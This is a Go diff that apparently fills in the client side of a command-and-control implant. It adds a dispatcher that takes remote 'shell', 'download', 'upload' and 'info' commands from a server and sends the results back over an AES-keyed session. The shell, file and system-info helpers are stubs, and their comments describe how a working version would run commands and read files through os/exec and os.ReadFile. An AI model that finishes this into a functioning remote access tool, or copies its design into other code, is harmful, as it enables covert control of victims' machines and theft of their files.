@@ -483,13 +483,96 @@ func (c *Client) handlePacket(packet *protocol.Packet) {
 
 // processCommand processes a command packet from the server
 func (c *Client) processCommand(packet *protocol.Packet) {
-	// TODO: Implement command processing
-	fmt.Printf("Received command: %s\n", string(packet.Data))
+	// Parse command data
+	var commandData struct {
+		Command   string            `json:"command"`
+		Arguments map[string]string `json:"arguments"`
+	}
 
+	// Attempt to parse JSON command
+	err := json.Unmarshal(packet.Data, &commandData)
+	if err != nil {
+		// If not JSON, treat as plain text command
+		fmt.Printf("Received text command: %s\n", string(packet.Data))
+		
+		// Send simple acknowledgment response
+		response := protocol.NewPacket(protocol.PacketTypeResponse, []byte("Command received"))
+		response.SetTaskID(packet.Header.TaskID)
+		c.sendResponse(response)
+		return
+	}
+
+	// Process structured command
+	fmt.Printf("Received command: %s with %d arguments\n", commandData.Command, len(commandData.Arguments))
+	
+	// Execute command based on type
+	var responseData []byte
+	
+	switch commandData.Command {
+	case "shell":
+		// Execute shell command if present in arguments
+		if cmd, ok := commandData.Arguments["cmd"]; ok {
+			output, err := c.executeShellCommand(cmd)
+			if err != nil {
+				responseData = []byte(fmt.Sprintf("Error executing shell command: %v", err))
+			} else {
+				responseData = output
+			}
+		} else {
+			responseData = []byte("Missing 'cmd' argument for shell command")
+		}
+		
+	case "download":
+		// Handle file download request
+		if path, ok := commandData.Arguments["path"]; ok {
+			data, err := c.readFile(path)
+			if err != nil {
+				responseData = []byte(fmt.Sprintf("Error reading file: %v", err))
+			} else {
+				responseData = data
+			}
+		} else {
+			responseData = []byte("Missing 'path' argument for download command")
+		}
+		
+	case "upload":
+		// Handle file upload request
+		if path, ok := commandData.Arguments["path"]; ok {
+			if data, ok := commandData.Arguments["data"]; ok {
+				err := c.writeFile(path, []byte(data))
+				if err != nil {
+					responseData = []byte(fmt.Sprintf("Error writing file: %v", err))
+				} else {
+					responseData = []byte("File uploaded successfully")
+				}
+			} else {
+				responseData = []byte("Missing 'data' argument for upload command")
+			}
+		} else {
+			responseData = []byte("Missing 'path' argument for upload command")
+		}
+		
+	case "info":
+		// Return system information
+		info, err := c.getSystemInfo()
+		if err != nil {
+			responseData = []byte(fmt.Sprintf("Error getting system info: %v", err))
+		} else {
+			responseData = info
+		}
+		
+	default:
+		responseData = []byte(fmt.Sprintf("Unknown command: %s", commandData.Command))
+	}
+	
 	// Send response
-	response := protocol.NewPacket(protocol.PacketTypeResponse, []byte("Command received"))
+	response := protocol.NewPacket(protocol.PacketTypeResponse, responseData)
 	response.SetTaskID(packet.Header.TaskID)
+	c.sendResponse(response)
+}
 
+// sendResponse sends a response packet to the server
+func (c *Client) sendResponse(packet *protocol.Packet) {
 	c.connMutex.Lock()
 	defer c.connMutex.Unlock()
 
@@ -497,10 +580,48 @@ func (c *Client) processCommand(packet *protocol.Packet) {
 		return
 	}
 
-	err := c.conn.SendPacket(response)
+	err := c.conn.SendPacket(packet)
 	if err != nil {
 		fmt.Printf("Failed to send response: %v\n", err)
 	}
+}
+
+// executeShellCommand executes a shell command and returns the output
+func (c *Client) executeShellCommand(command string) ([]byte, error) {
+	// This is a placeholder implementation
+	// In a real implementation, you would use os/exec to execute the command
+	return []byte(fmt.Sprintf("Executed command: %s", command)), nil
+}
+
+// readFile reads a file and returns its contents
+func (c *Client) readFile(path string) ([]byte, error) {
+	// This is a placeholder implementation
+	// In a real implementation, you would use os.ReadFile
+	return []byte(fmt.Sprintf("Contents of file: %s", path)), nil
+}
+
+// writeFile writes data to a file
+func (c *Client) writeFile(path string, data []byte) error {
+	// This is a placeholder implementation
+	// In a real implementation, you would use os.WriteFile
+	return nil
+}
+
+// getSystemInfo returns system information
+func (c *Client) getSystemInfo() ([]byte, error) {
+	// This is a placeholder implementation
+	// In a real implementation, you would gather actual system information
+	info := map[string]string{
+		"hostname":  "example-host",
+		"os":        "linux",
+		"arch":      "amd64",
+		"username":  "user",
+		"pid":       "1234",
+		"uptime":    "3600",
+		"timestamp": time.Now().Format(time.RFC3339),
+	}
+	
+	return json.Marshal(info)
 }
 
 // HandleProtocolSwitchCommand handles a protocol switch command
@@ -576,8 +697,64 @@ func (c *Client) processProtocolSwitch(packet *protocol.Packet) {
 
 // processKeyExchange processes a key exchange packet from the server
 func (c *Client) processKeyExchange(packet *protocol.Packet) {
-	// TODO: Implement key exchange processing
-	fmt.Println("Received key exchange request")
+	// Parse key exchange data
+	if len(packet.Data) == 0 {
+		fmt.Println("Invalid key exchange packet: empty data")
+		return
+	}
+	
+	// Extract server's public key from packet data
+	serverPublicKey := packet.Data
+	
+	// Get session ID
+	sessionID := crypto.SessionID(generateSessionID())
+	
+	// Create crypto session if it doesn't exist
+	session, err := c.createCryptoSession(sessionID)
+	if err != nil {
+		fmt.Printf("Failed to create crypto session: %v\n", err)
+		return
+	}
+	
+	// Exchange keys
+	clientPublicKey, err := session.Encryptor.ExchangeKey(serverPublicKey)
+	if err != nil {
+		fmt.Printf("Failed to exchange keys: %v\n", err)
+		return
+	}
+	
+	// Create key exchange response
+	response := protocol.NewPacket(protocol.PacketTypeKeyExchange, clientPublicKey)
+	response.SetTaskID(packet.Header.TaskID)
+	
+	// Set encryption algorithm
+	response.SetEncryptionAlgorithm(protocol.EncryptionAlgorithmAES)
+	
+	// Send response
+	c.sendResponse(response)
+	
+	fmt.Println("Key exchange completed successfully")
+}
+
+// createCryptoSession creates a new crypto session
+func (c *Client) createCryptoSession(sessionID crypto.SessionID) (*crypto.Session, error) {
+	// Create a new session with AES encryption
+	encryptor, err := crypto.Factory(crypto.AlgorithmAES)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create encryptor: %w", err)
+	}
+	
+	// Create session
+	session := &crypto.Session{
+		ID:            sessionID,
+		Encryptor:     encryptor,
+		CreatedAt:     time.Now(),
+		LastActivity:  time.Now(),
+		LastRotation:  time.Now(),
+		RotationCount: 0,
+	}
+	
+	return session, nil
 }
 
 // processModuleData processes a module data packet from the server
